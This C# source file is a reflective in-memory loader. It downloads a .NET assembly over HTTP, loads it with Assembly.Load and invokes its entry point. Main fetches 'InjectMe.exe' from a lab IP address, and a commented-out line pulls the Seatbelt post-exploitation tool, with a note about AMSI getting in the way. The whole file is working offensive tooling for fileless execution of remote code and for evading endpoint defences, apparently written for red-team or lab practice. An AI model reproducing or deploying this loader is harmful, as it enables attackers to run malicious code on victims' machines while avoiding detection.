using System;
using System.IO;
using System.Reflection;
using System.Net;
using System.Threading;

namespace ReflectiveLoader
{
    class Program
    {
        public static Assembly reflectionFromPath(String path)
        {

            Byte[] rawAssemblyBytes = File.ReadAllBytes(path);
            Assembly bin = Assembly.Load(rawAssemblyBytes);
            return bin;

        }

        public static Assembly reflectionFromURL(String url, int retrycount = 3, int timeoutTimer = 60, bool printText = true)
        {
            int retry = retrycount;
            int timeout = timeoutTimer;
            Byte[] rawAssemblyBytes = new Byte[] { };
            Assembly bin = null;
            ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
            WebClient client = new WebClient();
            if (printText)
            {
                Console.WriteLine("attempting to download assembly from {0}: \n", url);
            }
            while (retry != 0)
            {
                try
                {
                    //will throw a HttpStatusCode.NotFound if file is not there.
                    rawAssemblyBytes = client.DownloadData(url);
                    Console.WriteLine("assembly found! loading now...");
                    Console.WriteLine("size of assembly: " + rawAssemblyBytes.Length);
                    bin = Assembly.Load(rawAssemblyBytes);
                    return bin;
                }

                catch (WebException webExc) //handle the 404
                {
                    HttpWebResponse response = (HttpWebResponse)webExc.Response;
                    if (response.StatusCode == HttpStatusCode.NotFound) //keep retrying until either file is found or retry attempts are 0
                    {
                        Console.WriteLine("Assembly not found yet. sleeping for {0} seconds and retrying another {1} times...", timeout, retry);
                        retry--;
                        Thread.Sleep(timeout * 1000);
                    }
                }

            }
            throw new WebException("Assembly not found. Aborting...");
        }


        public static Type[] getTypes(Assembly assembly)
        {

            Type[] assemblyTypes = assembly.GetTypes();
            Console.WriteLine("The following classes are available in {0}: ", assembly.GetName());
            foreach (Type classType in assemblyTypes)
            {
                Console.WriteLine(classType.Name);
            }
            Console.WriteLine("==============================");
            return assemblyTypes;
        }

  
        public static Type GetTypeByShortName(Assembly assembly,String className = "Program")
        {
            Type[] assemblyTypes = assembly.GetTypes();
            Type classType = null;
            String errorString = "";
            foreach(Type cType in assemblyTypes)
            {
                errorString += "\n"+cType.Name;
                if(className == cType.Name)
                {
                    classType = cType;
                }
            }
            if(classType == null)
            {
                throw new NullReferenceException(String.Format("{0} could not be found, available classes are {1}",className,errorString));
            }
            return classType;
        }

        public static MethodInfo[] getMethodsForType(Type classType)
        {
            MethodInfo[] methods = classType.GetMethods();
            Console.WriteLine("The available methods for {0} are: ", classType.Name);
            foreach (MethodInfo method in methods)
            {

                Console.WriteLine(method.Name);
                //Console.WriteLine(method.Attributes);
            }
            Console.WriteLine("==============================");
            return methods;
        }


        public static void Execute(Assembly tool,Object[] arguments, String function = "Main", String className ="Program")
        {
            try
            {
                Type program =  GetTypeByShortName(tool,className);
                MethodInfo functionEntryPoint = program.GetMethod(function, BindingFlags.NonPublic | BindingFlags.Static | BindingFlags.Public);
                object initalizedProgram = Activator.CreateInstance(program);
                Console.WriteLine(String.Format("Calling {0} method from {1} of {2}...", functionEntryPoint.Name, program.Name, tool.GetName()));
                functionEntryPoint.Invoke(initalizedProgram, arguments);
            }
            catch(Exception e)
            {
                Console.Error.WriteLine(e.Message);
            }
        }


        static void Main(string[] args)
        {
            try
            {
                //DEMO - show amsi screwing up the download. 
               // Assembly loadedAssembly = reflectionFromURL(@"https://github.com/Flangvik/SharpCollection/blob/master/NetFramework_4.5_x64/Seatbelt.exe?raw=true", 3, 5);
               Assembly loadedAssembly = reflectionFromURL(@"http://192.168.56.1:8080/InjectMe.exe", 3, 10);
                Object[] funcArgs = new string[] { null};
                Execute(loadedAssembly, funcArgs,"Main");
                /*
                Type program = getTypes(loadedAssembly)[0];
                getMethodsForType(program);
                MethodInfo mainMethod = program.GetMethod("success");
                object initalizedProgram = Activator.CreateInstance(program);
                Console.WriteLine("Calling the {0} method from the  {1} class of the {2} assembly, let's see what happens... ", mainMethod.Name, program.Name, loadedAssembly.GetName());
                mainMethod.Invoke(initalizedProgram, null);
                */
            }
            catch (Exception e)
            {
                Console.WriteLine(e.Message);
            }
            Console.ReadKey();

        }
    }
}